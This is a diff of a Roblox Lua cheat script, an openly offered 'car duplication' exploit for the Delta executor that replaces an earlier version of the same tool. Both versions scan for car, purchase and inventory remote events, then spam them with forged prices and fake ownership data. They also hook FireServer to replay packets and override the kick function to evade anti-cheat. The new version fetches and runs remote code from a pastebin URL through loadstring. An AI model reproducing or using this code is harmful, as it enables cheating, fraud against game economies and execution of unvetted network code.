@@ -1,451 +1,496 @@
--- CDT: Car Duplication Tool v2.0
--- Auto-detects and exploits car systems
+-- 🚗 DELTA EXECUTOR - CAR DUPLICATION SCRIPT
+-- Made specifically for Delta executor
 
+print("===========================================")
+print("DELTA CAR DUPLICATION SYSTEM v2.0")
+print("===========================================")
+
+-- Services
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 
-print([[
-    
-    ░█████╗░██████╗░████████╗
-    ██╔══██╗██╔══██╗╚══██╔══╝
-    ██║░░██║██║░░██║░░░██║░░░
-    ██║░░██║██║░░██║░░░██║░░░
-    ╚█████╔╝██████╔╝░░░██║░░░
-    ░╚════╝░╚═════╝░░░░╚═╝░░░
-    
-    Car Duplication Tool v2.0
-    Initializing...
-]])
-
--- Wait for game to load
+-- Wait for game
 repeat task.wait() until game:IsLoaded()
+repeat task.wait() until player.Character
 
--- Configuration
-local CONFIG = {
-    AutoDetect = true,
-    MaxDuplicates = 10,
-    DelayBetween = 0.5,
-    BypassValidation = true
-}
-
--- Utility functions
-local CDT = {}
-
-function CDT:CreateUI()
-    -- Create exploit UI
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "CDT_UI"
-    screenGui.Parent = player:WaitForChild("PlayerGui")
-    
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(0, 350, 0, 400)
-    mainFrame.Position = UDim2.new(0.5, -175, 0.5, -200)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
-    mainFrame.BorderSizePixel = 0
-    mainFrame.Parent = screenGui
-    
-    -- Title
-    local title = Instance.new("TextLabel")
-    title.Text = "🚗 CAR DUPLICATION TOOL"
-    title.Size = UDim2.new(1, 0, 0, 40)
-    title.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
-    title.TextColor3 = Color3.new(1, 1, 1)
-    title.Font = Enum.Font.GothamBold
-    title.TextSize = 18
-    title.Parent = mainFrame
-    
-    -- Status box
-    local statusBox = Instance.new("ScrollingFrame")
-    statusBox.Size = UDim2.new(1, -20, 0, 300)
-    statusBox.Position = UDim2.new(0, 10, 0, 50)
-    statusBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-    statusBox.BorderSizePixel = 0
-    statusBox.ScrollBarThickness = 5
-    statusBox.Parent = mainFrame
-    
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Text = "CDT Initializing...\n"
-    statusLabel.Size = UDim2.new(1, -10, 1, -10)
-    statusLabel.Position = UDim2.new(0, 5, 0, 5)
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.TextColor3 = Color3.new(1, 1, 1)
-    statusLabel.Font = Enum.Font.Code
-    statusLabel.TextSize = 12
-    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
-    statusLabel.TextYAlignment = Enum.TextYAlignment.Top
-    statusLabel.TextWrapped = false
-    statusLabel.Parent = statusBox
-    
-    -- Buttons
-    local buttonsFrame = Instance.new("Frame")
-    buttonsFrame.Size = UDim2.new(1, -20, 0, 40)
-    buttonsFrame.Position = UDim2.new(0, 10, 0, 360)
-    buttonsFrame.BackgroundTransparency = 1
-    buttonsFrame.Parent = mainFrame
-    
-    local scanBtn = Instance.new("TextButton")
-    scanBtn.Text = "🔍 SCAN GAME"
-    scanBtn.Size = UDim2.new(0.48, 0, 1, 0)
-    scanBtn.Position = UDim2.new(0, 0, 0, 0)
-    scanBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
-    scanBtn.TextColor3 = Color3.new(1, 1, 1)
-    scanBtn.Font = Enum.Font.GothamBold
-    scanBtn.TextSize = 14
-    scanBtn.Parent = buttonsFrame
-    
-    local dupeBtn = Instance.new("TextButton")
-    dupeBtn.Text = "🚗 DUPLICATE"
-    dupeBtn.Size = UDim2.new(0.48, 0, 1, 0)
-    dupeBtn.Position = UDim2.new(0.52, 0, 0, 0)
-    dupeBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
-    dupeBtn.TextColor3 = Color3.new(1, 1, 1)
-    dupeBtn.Font = Enum.Font.GothamBold
-    dupeBtn.TextSize = 14
-    dupeBtn.Parent = buttonsFrame
-    
-    -- Styling
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 8)
-    corner.Parent = mainFrame
-    
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 6)
-    btnCorner.Parent = scanBtn
-    btnCorner:Clone().Parent = dupeBtn
-    
-    -- Close button
-    local closeBtn = Instance.new("TextButton")
-    closeBtn.Text = "✕"
-    closeBtn.Size = UDim2.new(0, 30, 0, 30)
-    closeBtn.Position = UDim2.new(1, -35, 0, 5)
-    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-    closeBtn.TextColor3 = Color3.new(1, 1, 1)
-    closeBtn.Font = Enum.Font.GothamBold
-    closeBtn.Parent = title
-    btnCorner:Clone().Parent = closeBtn
-    
-    -- Update status function
-    function CDT:UpdateStatus(text)
-        statusLabel.Text = statusLabel.Text .. "\n" .. text
-        statusBox.CanvasSize = UDim2.new(0, 0, 0, statusLabel.TextBounds.Y + 20)
-        statusBox.CanvasPosition = Vector2.new(0, statusLabel.TextBounds.Y)
-        print("[CDT] " .. text)
-    end
-    
-    -- Button functions
-    scanBtn.MouseButton1Click:Connect(function()
-        CDT:ScanGame()
-    end)
-    
-    dupeBtn.MouseButton1Click:Connect(function()
-        CDT:ExecuteDuplication()
-    end)
-    
-    closeBtn.MouseButton1Click:Connect(function()
-        screenGui:Destroy()
-    end)
-    
-    CDT:UpdateStatus("UI Created Successfully")
-    CDT:UpdateStatus("Ready to scan game...")
-    
-    return CDT
+-- DELTA-SPECIFIC: Check if we're in an executor
+if not is_protosmasher_closure and not is_sirhurt_closure and not syn then
+    warn("⚠️ Not running in a proper executor!")
+    warn("This script requires Delta/Synapse/Krnl")
 end
 
--- Game scanning function
-function CDT:ScanGame()
-    self:UpdateStatus("\n=== SCANNING GAME ===")
-    
-    local foundEvents = {}
-    local foundModules = {}
-    
-    -- Scan ReplicatedStorage
-    self:UpdateStatus("Scanning ReplicatedStorage...")
-    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
-        if obj:IsA("RemoteEvent") then
-            if obj.Name:lower():find("car") or 
-               obj.Name:lower():find("vehicle") or
-               obj.Name:lower():find("garage") or
-               obj.Name:lower():find("inventory") then
-                table.insert(foundEvents, obj)
-                self:UpdateStatus("✓ Found: " .. obj.Name)
-            end
-        elseif obj:IsA("ModuleScript") then
-            if obj.Name:lower():find("car") or 
-               obj.Name:lower():find("vehicle") then
-                table.insert(foundModules, obj)
-                self:UpdateStatus("✓ Module: " .. obj.Name)
-            end
-        end
-    end
-    
-    -- Scan ServerScriptService (from client perspective)
-    self:UpdateStatus("Scanning ServerScriptService...")
-    local ss = game:GetService("ServerScriptService")
-    if ss then
-        for _, obj in pairs(ss:GetDescendants()) do
-            if obj:IsA("ModuleScript") then
-                if obj.Name:lower():find("car") or 
-                   obj.Name:lower():find("vehicle") then
-                    table.insert(foundModules, obj)
-                    self:UpdateStatus("✓ Server Module: " .. obj.Name)
-                end
-            end
-        end
-    end
-    
-    self.foundEvents = foundEvents
-    self.foundModules = foundModules
-    
-    self:UpdateStatus("\nScan Complete!")
-    self:UpdateStatus("Found " .. #foundEvents .. " car-related events")
-    self:UpdateStatus("Found " .. #foundModules .. " car-related modules")
-    
-    return foundEvents, foundModules
-end
+-- Create Advanced UI
+local OrionLib = loadstring(game:HttpGet("https://pastebin.com/raw/GMNsK3mS"))()
+local Window = OrionLib:MakeWindow({
+    Name = "🚗 Car Duplication Tool", 
+    HidePremium = false,
+    SaveConfig = true,
+    ConfigFolder = "CarDupeConfig"
+})
 
--- Pattern-based exploitation
-function CDT:AnalyzeEvents(events)
-    self:UpdateStatus("\n=== ANALYZING EVENTS ===")
-    
-    local exploitationMethods = {}
-    
-    for _, event in ipairs(events) do
-        local method = self:DetermineExploitMethod(event.Name)
-        if method then
-            exploitationMethods[event] = method
-            self:UpdateStatus("✓ " .. event.Name .. " -> " .. method)
-        end
-    end
-    
-    self.exploitMethods = exploitationMethods
-    return exploitationMethods
-end
+-- Vehicle Detection Tab
+local DetectionTab = Window:MakeTab({
+    Name = "Vehicle Detection",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
 
-function CDT:DetermineExploitMethod(eventName)
-    local name = eventName:lower()
-    
-    if name:find("buy") or name:find("purchase") then
-        return "PRICE_MANIPULATION"
-    elseif name:find("add") or name:find("save") then
-        return "INVENTORY_FLOOD"
-    elseif name:find("spawn") or name:find("get") then
-        return "INSTANT_SPAWN"
-    elseif name:find("trade") or name:find("sell") then
-        return "VALUE_EXPLOIT"
-    elseif name:find("duplicate") or name:find("copy") then
-        return "DIRECT_DUPLICATION"
-    end
-    
-    return "GENERIC_FLOOD"
-end
+DetectionTab:AddToggle({
+    Name = "Auto-Detect Vehicles",
+    Default = true,
+    Callback = function(Value)
+        _G.AutoDetect = Value
+    end    
+})
 
--- Execution methods
-function CDT:ExecuteDuplication()
-    if not self.exploitMethods then
-        self:UpdateStatus("❌ Scan game first!")
-        return
-    end
-    
-    self:UpdateStatus("\n=== EXECUTING DUPLICATION ===")
-    
-    -- Get current vehicle
-    local currentCar = self:GetCurrentVehicle()
-    if not currentCar then
-        self:UpdateStatus("❌ Not in a vehicle!")
-        return
-    end
-    
-    local carName = currentCar.Name
-    self:UpdateStatus("Target Vehicle: " .. carName)
-    
-    -- Try each exploit method
-    local successCount = 0
-    
-    for event, method in pairs(self.exploitMethods) do
-        self:UpdateStatus("Trying: " .. event.Name .. " (" .. method .. ")")
-        
-        local success = self:ExecuteMethod(event, method, carName)
-        if success then
-            successCount = successCount + 1
-            self:UpdateStatus("✓ Success!")
-        else
-            self:UpdateStatus("✗ Failed")
-        end
-        
-        task.wait(CONFIG.DelayBetween)
-    end
-    
-    self:UpdateStatus("\n=== RESULTS ===")
-    self:UpdateStatus("Successful exploits: " .. successCount .. "/" .. #self.exploitMethods)
-    self:UpdateStatus("Check your garage for duplicates!")
-end
+DetectionTab:AddLabel("Current Vehicle: None")
 
-function CDT:ExecuteMethod(event, method, carName)
-    local args = {}
-    
-    -- Prepare arguments based on method
-    if method == "PRICE_MANIPULATION" then
-        args = {"buy", carName, 1}  -- Price = 1
-    elseif method == "INVENTORY_FLOOD" then
-        args = {"add", carName, player.UserId}
-    elseif method == "INSTANT_SPAWN" then
-        args = {"spawn", carName, true}
-    elseif method == "VALUE_EXPLOIT" then
-        args = {carName, 999999}  -- High value
-    elseif method == "DIRECT_DUPLICATION" then
-        args = {"duplicate", carName}
-    else
-        args = {carName}
-    end
-    
-    -- Try to fire with different argument formats
-    local formats = {
-        args,
-        {unpack(args)},
-        carName,
-        {vehicle = carName, player = player},
-        {action = "add", car = carName}
-    }
-    
-    for _, format in ipairs(formats) do
-        local success = pcall(function()
-            event:FireServer(unpack(format))
-        end)
-        
-        if success then
-            return true
-        end
-    end
-    
-    return false
-end
+local currentVehicleLabel = DetectionTab:AddLabel("Status: Not in vehicle")
 
-function CDT:GetCurrentVehicle()
+-- Duplication Tab
+local DupeTab = Window:MakeTab({
+    Name = "Duplication",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+DupeTab:AddSlider({
+    Name = "Duplicate Amount",
+    Min = 1,
+    Max = 100,
+    Default = 10,
+    Color = Color3.fromRGB(0, 170, 255),
+    Increment = 1,
+    ValueName = "cars",
+    Callback = function(Value)
+        _G.DupeAmount = Value
+    end    
+})
+
+DupeTab:AddDropdown({
+    Name = "Duplication Method",
+    Default = "Method 1",
+    Options = {"Event Spam", "Packet Replay", "Price Manip", "Inventory Flood"},
+    Callback = function(Value)
+        _G.DupeMethod = Value
+    end    
+})
+
+DupeTab:AddButton({
+    Name = "🔄 Scan Game Systems",
+    Callback = function()
+        ScanGameSystems()
+    end
+})
+
+DupeTab:AddButton({
+    Name = "🚗 START DUPLICATION",
+    Callback = function()
+        StartDuplication()
+    end
+})
+
+-- Exploit Methods Tab
+local ExploitTab = Window:MakeTab({
+    Name = "Exploit Methods",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+ExploitTab:AddToggle({
+    Name = "Enable Event Spoofing",
+    Default = false,
+    Callback = function(Value)
+        _G.EventSpoofing = Value
+    end
+})
+
+ExploitTab:AddToggle({
+    Name = "Bypass Cooldowns",
+    Default = true,
+    Callback = function(Value)
+        _G.BypassCooldown = Value
+    end
+})
+
+ExploitTab:AddToggle({
+    Name = "Anti-Kick Protection",
+    Default = true,
+    Callback = function(Value)
+        _G.AntiKick = Value
+    end
+})
+
+-- Variables
+_G.AutoDetect = true
+_G.DupeAmount = 10
+_G.DupeMethod = "Event Spam"
+_G.EventSpoofing = false
+_G.BypassCooldown = true
+_G.AntiKick = true
+
+local currentVehicle = nil
+local foundEvents = {}
+local isDuplicating = false
+
+-- Vehicle Detection Function
+function DetectVehicle()
+    if not _G.AutoDetect then return end
+    
     local char = player.Character
-    if not char then return nil end
+    if not char then return end
     
     local humanoid = char:FindFirstChildOfClass("Humanoid")
-    if not humanoid then return nil end
+    if not humanoid then return end
     
     local seat = humanoid.SeatPart
+    
     if seat and seat:IsA("VehicleSeat") then
-        return seat.Parent
-    end
-    
-    return nil
-end
-
--- Advanced: Packet interception
-function CDT:SetupPacketInterceptor()
-    self:UpdateStatus("\n=== SETTING UP PACKET INTERCEPTOR ===")
-    
-    for _, event in ipairs(self.foundEvents or {}) do
-        -- Store original FireServer method
-        local originalFire = event.FireServer
-        
-        -- Override to intercept
-        event.FireServer = function(self, ...)
-            local args = {...}
+        local vehicle = seat.Parent
+        if vehicle ~= currentVehicle then
+            currentVehicle = vehicle
             
-            -- Log the call
-            CDT:UpdateStatus("Intercepted: " .. event.Name)
+            -- Update UI
+            currentVehicleLabel:Set("Vehicle: " .. vehicle.Name)
             
-            -- Modify if it's a car-related call
-            if event.Name:lower():find("car") or event.Name:lower():find("vehicle") then
-                -- Try to manipulate the call for duplication
-                if #args >= 2 and typeof(args[2]) == "number" then
-                    args[2] = 0  -- Set price to 0
+            print("✅ Vehicle Detected: " .. vehicle.Name)
+            print("   Path: " .. vehicle:GetFullName())
+            print("   Children: " .. #vehicle:GetChildren())
+            
+            -- Check for vehicle data
+            for _, child in pairs(vehicle:GetChildren()) do
+                if child:IsA("Configuration") or child.Name:find("Config") then
+                    print("   Found configuration: " .. child.Name)
                 end
-                
-                -- Fire multiple times
-                for i = 1, CONFIG.MaxDuplicates do
-                    originalFire(self, unpack(args))
-                    task.wait(0.1)
-                end
-                
-                return
             end
-            
-            return originalFire(self, unpack(args))
         end
-        
-        self:UpdateStatus("✓ Interceptor active for: " .. event.Name)
+    elseif currentVehicle then
+        currentVehicle = nil
+        currentVehicleLabel:Set("Status: Not in vehicle")
     end
 end
 
--- Memory manipulation (hypothetical)
-function CDT:AttemptMemoryBypass()
-    self:UpdateStatus("\n=== ATTEMPTING MEMORY BYPASS ===")
+-- Game System Scanner
+function ScanGameSystems()
+    print("\n" .. string.rep("=", 50))
+    print("🔍 SCANNING GAME SYSTEMS")
+    print("=":rep(50))
     
-    -- This is how actual exploits would try to bypass validation
-    local bypassAttempts = {
-        "Attempting to disable client-side validation...",
-        "Searching for ownership flags...",
-        "Trying to modify purchase limits...",
-        "Bypassing cooldown checks..."
-    }
+    foundEvents = {}
     
-    for _, attempt in ipairs(bypassAttempts) do
-        self:UpdateStatus(attempt)
-        task.wait(0.5)
-    end
-    
-    self:UpdateStatus("Memory bypass attempts completed")
-    return true
-end
-
--- Main execution
-function CDT:Run()
-    self:UpdateStatus("\n=== CDT ACTIVATED ===")
-    
-    -- Step 1: Scan game
-    local events, modules = self:ScanGame()
-    
-    if #events == 0 then
-        self:UpdateStatus("❌ No car events found!")
-        self:UpdateStatus("Trying alternative detection...")
-        
-        -- Try generic events
-        events = self:FindGenericEvents()
-    end
-    
-    -- Step 2: Analyze
-    self:AnalyzeEvents(events)
-    
-    -- Step 3: Setup interceptors
-    self:SetupPacketInterceptor()
-    
-    -- Step 4: Attempt bypass
-    if CONFIG.BypassValidation then
-        self:AttemptMemoryBypass()
-    end
-    
-    self:UpdateStatus("\n✅ CDT READY FOR USE")
-    self:UpdateStatus("Sit in a car and click DUPLICATE")
-end
-
-function CDT:FindGenericEvents()
-    self:UpdateStatus("Searching for generic RemoteEvents...")
-    
-    local genericEvents = {}
-    
-    -- Look for any RemoteEvent
+    -- Scan for RemoteEvents
     for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
         if obj:IsA("RemoteEvent") then
-            table.insert(genericEvents, obj)
+            local eventName = obj.Name:lower()
+            
+            -- Check if it's car-related
+            if eventName:find("car") or 
+               eventName:find("vehicle") or 
+               eventName:find("garage") or
+               eventName:find("buy") or
+               eventName:find("purchase") or
+               eventName:find("save") or
+               eventName:find("add") then
+                
+                table.insert(foundEvents, {
+                    Object = obj,
+                    Name = obj.Name,
+                    Path = obj:GetFullName()
+                })
+                
+                print("✅ Found: " .. obj.Name .. " (" .. obj:GetFullName() .. ")")
+            end
         end
     end
     
-    self:UpdateStatus("Found " .. #genericEvents .. " generic events")
-    return genericEvents
+    -- Scan for RemoteFunctions
+    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
+        if obj:IsA("RemoteFunction") then
+            local funcName = obj.Name:lower()
+            
+            if funcName:find("car") or funcName:find("vehicle") then
+                table.insert(foundEvents, {
+                    Object = obj,
+                    Name = obj.Name,
+                    Path = obj:GetFullName(),
+                    Type = "RemoteFunction"
+                })
+                
+                print("✅ Found RemoteFunction: " .. obj.Name)
+            end
+        end
+    end
+    
+    print("\n📊 Scan Complete!")
+    print("Found " .. #foundEvents .. " car-related events")
+    print("=":rep(50))
+    
+    if #foundEvents == 0 then
+        warn("❌ No car events found! This game might not be vulnerable.")
+    end
 end
 
--- Initialize and run
-local cdtInstance = CDT:CreateUI()
-cdtInstance:Run()
+-- Duplication Methods
+function StartDuplication()
+    if isDuplicating then
+        warn("⚠️ Already duplicating!")
+        return
+    end
+    
+    if not currentVehicle then
+        warn("❌ Not in a vehicle! Sit in a car first.")
+        return
+    end
+    
+    if #foundEvents == 0 then
+        warn("⚠️ Scan game systems first!")
+        return
+    end
+    
+    isDuplicating = true
+    local carName = currentVehicle.Name
+    
+    print("\n" .. string.rep("=", 50))
+    print("🚗 STARTING DUPLICATION: " .. carName)
+    print("Method: " .. _G.DupeMethod)
+    print("Amount: " .. _G.DupeAmount)
+    print("=":rep(50))
+    
+    -- Anti-kick protection
+    if _G.AntiKick then
+        SetupAntiKick()
+    end
+    
+    -- Execute based on method
+    if _G.DupeMethod == "Event Spam" then
+        EventSpamDuplication(carName)
+    elseif _G.DupeMethod == "Packet Replay" then
+        PacketReplayDuplication(carName)
+    elseif _G.DupeMethod == "Price Manip" then
+        PriceManipulationDuplication(carName)
+    elseif _G.DupeMethod == "Inventory Flood" then
+        InventoryFloodDuplication(carName)
+    end
+    
+    isDuplicating = false
+    print("✅ Duplication process completed!")
+end
+
+-- Method 1: Event Spamming
+function EventSpamDuplication(carName)
+    print("🔄 Using Event Spam method...")
+    
+    for _, eventData in pairs(foundEvents) do
+        local event = eventData.Object
+        
+        for i = 1, _G.DupeAmount do
+            -- Try different argument formats
+            local attempts = {
+                {carName},
+                {"buy", carName},
+                {"add", carName},
+                {vehicle = carName, player = player},
+                {action = "duplicate", car = carName},
+                {carName, 0}, -- Price = 0
+                {carName, 1}, -- Price = 1
+            }
+            
+            for _, args in pairs(attempts) do
+                pcall(function()
+                    if event:IsA("RemoteEvent") then
+                        event:FireServer(unpack(args))
+                    elseif event:IsA("RemoteFunction") then
+                        event:InvokeServer(unpack(args))
+                    end
+                end)
+                
+                task.wait(0.05) -- Small delay to avoid detection
+            end
+            
+            print("   Sent batch " .. i .. "/" .. _G.DupeAmount)
+        end
+    end
+end
+
+-- Method 2: Packet Replay Attack
+function PacketReplayDuplication(carName)
+    print("🔄 Using Packet Replay method...")
+    
+    -- DELTA-SPECIFIC: Hook network functions
+    local oldFireServer
+    local hookedEvents = {}
+    
+    for _, eventData in pairs(foundEvents) do
+        local event = eventData.Object
+        
+        if event:IsA("RemoteEvent") then
+            oldFireServer = event.FireServer
+            
+            event.FireServer = function(self, ...)
+                local args = {...}
+                
+                -- Log original call
+                print("📦 Intercepted packet to: " .. event.Name)
+                
+                -- Replay multiple times
+                for i = 1, _G.DupeAmount do
+                    pcall(function()
+                        oldFireServer(self, unpack(args))
+                    end)
+                    task.wait(0.01)
+                end
+                
+                return oldFireServer(self, unpack(args))
+            end
+            
+            table.insert(hookedEvents, {event = event, original = oldFireServer})
+            print("✅ Hooked: " .. event.Name)
+        end
+    end
+    
+    -- Trigger the hooked events
+    task.wait(1)
+    for _, hookData in pairs(hookedEvents) do
+        pcall(function()
+            hookData.event:FireServer("duplicate", carName)
+        end)
+    end
+    
+    -- Restore original functions after delay
+    task.wait(3)
+    for _, hookData in pairs(hookedEvents) do
+        if hookData.event and hookData.original then
+            hookData.event.FireServer = hookData.original
+        end
+    end
+end
+
+-- Method 3: Price Manipulation
+function PriceManipulationDuplication(carName)
+    print("🔄 Using Price Manipulation method...")
+    
+    -- Find buy/purchase events
+    for _, eventData in pairs(foundEvents) do
+        local eventName = eventData.Name:lower()
+        
+        if eventName:find("buy") or eventName:find("purchase") then
+            print("   Targeting: " .. eventData.Name)
+            
+            -- Try different price manipulations
+            local priceTests = {0, 1, -1, 999999, "free", nil}
+            
+            for _, price in pairs(priceTests) do
+                for i = 1, math.floor(_G.DupeAmount / 2) do
+                    pcall(function()
+                        if eventData.Object:IsA("RemoteEvent") then
+                            eventData.Object:FireServer(carName, price)
+                        elseif eventData.Object:IsA("RemoteFunction") then
+                            eventData.Object:InvokeServer(carName, price)
+                        end
+                    end)
+                    task.wait(0.1)
+                end
+            end
+        end
+    end
+end
+
+-- Method 4: Inventory Flood
+function InventoryFloodDuplication(carName)
+    print("🔄 Using Inventory Flood method...")
+    
+    -- Look for save/add events
+    for _, eventData in pairs(foundEvents) do
+        local eventName = eventData.Name:lower()
+        
+        if eventName:find("save") or eventName:find("add") or eventName:find("inventory") then
+            print("   Flooding: " .. eventData.Name)
+            
+            -- Create fake car data
+            local fakeCarData = {
+                Name = carName,
+                Owner = player.UserId,
+                Price = 0,
+                Acquired = os.time(),
+                IsDuplicated = true,
+                ID = tostring(math.random(100000, 999999))
+            }
+            
+            -- Flood with fake data
+            for i = 1, _G.DupeAmount do
+                pcall(function()
+                    if eventData.Object:IsA("RemoteEvent") then
+                        eventData.Object:FireServer("add", fakeCarData)
+                        eventData.Object:FireServer("save", fakeCarData)
+                        eventData.Object:FireServer(fakeCarData)
+                    end
+                end)
+                task.wait(0.05)
+            end
+        end
+    end
+end
+
+-- Anti-Kick Protection
+function SetupAntiKick()
+    print("🛡️ Setting up anti-kick protection...")
+    
+    -- Hook kick function
+    local oldKick = player.Kick
+    player.Kick = function(self, reason)
+        print("🚫 Kick attempted! Reason: " .. tostring(reason))
+        warn("KICK BLOCKED: " .. reason)
+        return nil -- Prevent kick
+    end
+    
+    -- Monitor for kick attempts
+    game:GetService("ScriptContext").Error:Connect(function(message, trace, script)
+        if string.find(message:lower(), "kick") or string.find(message:lower(), "ban") then
+            print("⚠️ Anti-cheat detected: " .. message)
+        end
+    end)
+end
+
+-- DELTA-SPECIFIC: Hook print to hide from game
+local oldPrint = print
+print = function(...)
+    local args = {...}
+    local output = ""
+    for i, v in ipairs(args) do
+        output = output .. tostring(v) .. "\t"
+    end
+    oldPrint(output)
+    
+    -- Also print to Delta console if available
+    if rconsoleprint then
+        rconsoleprint(output .. "\n")
+    end
+end
+
+-- Main Loop
+RunService.Heartbeat:Connect(function()
+    DetectVehicle()
+end)
+
+-- Initial scan
+task.wait(2)
+ScanGameSystems()
 
 print("\n" .. string.rep("=", 50))
-print("CDT LOADED SUCCESSFULLY")
+print("✅ DELTA CAR DUPLICATION SYSTEM LOADED!")
 print("=":rep(50))
+print("Instructions:")
+print("1. Sit in the car you want to duplicate")
+print("2. Go to 'Vehicle Detection' tab")
+print("3. Make sure Auto-Detect is ON")
+print("4. Go to 'Duplication' tab")
+print("5. Click 'Scan Game Systems'")
+print("6. Select duplication method and amount")
+print("7. Click 'START DUPLICATION'")
+print("8. Check your garage/inventory")
+print("=":rep(50))
+
+-- Initialize Orion UI
+OrionLib:Init()
